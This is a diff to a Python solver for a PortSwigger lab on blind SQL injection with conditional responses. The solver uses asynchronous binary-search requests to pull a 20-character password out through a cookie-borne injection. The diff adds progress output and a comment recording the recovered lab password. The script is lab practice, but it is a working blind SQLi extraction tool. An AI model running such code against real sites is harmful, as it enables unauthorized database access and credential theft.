@@ -31,7 +31,7 @@ software for malicious purposes.
 # Author: HackHuang
 # Description: For Lab: Blind SQL injection with conditional responses
 # Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
-# Last Modified: 2024/12/19
+# Last Modified: 2024/12/27
 
 import aiohttp
 import asyncio
@@ -56,10 +56,10 @@ all_char_ascii_list: List[int] = [ord(char) for char in all_char_list]
 all_char_ascii_sorted_list: List[int] = sorted(all_char_ascii_list)
 all_char_sorted_list: List[str] = [chr(char_ascii) for char_ascii in all_char_ascii_sorted_list]
 
-host: str = "0a4b00c60329478f81cee81f00ae00ef.web-security-academy.net"
+host: str = "0ad500660420b90d829675a500b50003.web-security-academy.net"
 url: str = f"https://{host}/login"
-session: str = "session=ZCCHJuUD7gVhnuMc7rg1XsMHZ4APkut0"
-tracking_id: str = f"TrackingId=bqPEKoyg8MNi3H1u"
+session: str = "session=xlR1zBh8WTrHCCoYFWOg9M5y0ZC5ynT5"
+tracking_id: str = f"TrackingId=KLTJs7ZygHmnmrwk"
 
 @contextmanager
 def print_code_snippet_performance(operation: str) -> Generator[None, None, None]:
@@ -101,8 +101,10 @@ async def binary_search_test_async(sql_1: str, sql_2: str, pattern: str) -> int:
             print(f'Get the char index successfully ---> {sql_injection_1}\n')
             return mid
         elif await get_method_async(url=url, headers={"Host": host, "Cookie": cookie_2}, pattern=pattern):
+            print(f'({low}, {mid}, {high}) ---> {sql_injection_2}')
             low = mid + 1
         else:
+            print(f'({low}, {mid}, {high}) ---> OPPOSITE : {sql_injection_2}')
             high = mid - 1
     return -1
 
@@ -117,20 +119,24 @@ async def get_data_with_binary_search_async(password_length: int, pattern: str) 
         tasks.append(binary_search_test_async(sql_1=sql_injection_1, sql_2=sql_injection_2, pattern=pattern))
         count = count + 1
         substr_begin_index = substr_begin_index + 1
-    result = await asyncio.gather(*tasks)
-    for r in result:
-        if r == -1:
+    char_ascii_list = await asyncio.gather(*tasks)
+    for char_ascii in char_ascii_list:
+        if char_ascii == -1:
             print(f'Not found the index of data char')
+            exit()
         else:
-            data_char_ascii = all_char_ascii_sorted_list[r]
+            data_char_ascii = all_char_ascii_sorted_list[char_ascii]
             data_str = data_str + chr(data_char_ascii)
+            print(f'Got the password : {data_str}, and its length : {len(data_str)}\n')
     return data_str
 
+# The final password is : 9kf4paq3iy4ss0h6rgly
+# Memory usage:            0.441155 MB 
+# Peak memory usage:       6.463519 MB
+# Finished get data with binary search and asyncio in 61.187596 seconds
 async def main():
-    result: str = await get_data_with_binary_search_async(password_length=20, pattern='Welcome back')
-    print(f'The Password is : {result}')
+    password_str: str = await get_data_with_binary_search_async(password_length=20, pattern='Welcome back')
+    print(f'The final password is : {password_str}')
 
-# 好吧, 尽力了, 看来 PortSwigger Lab 的访问还是很受限制的, 当我尝试使用异步 + 二分查找算法时, 
-# 可能因短时间内, 请求过于频繁或请求次数过多，服务器抛出错误: aiohttp.client_exceptions.ServerDisconnectedError: Server disconnected...
 with print_code_snippet_performance('get data with binary search and asyncio'):
     asyncio.run(main())
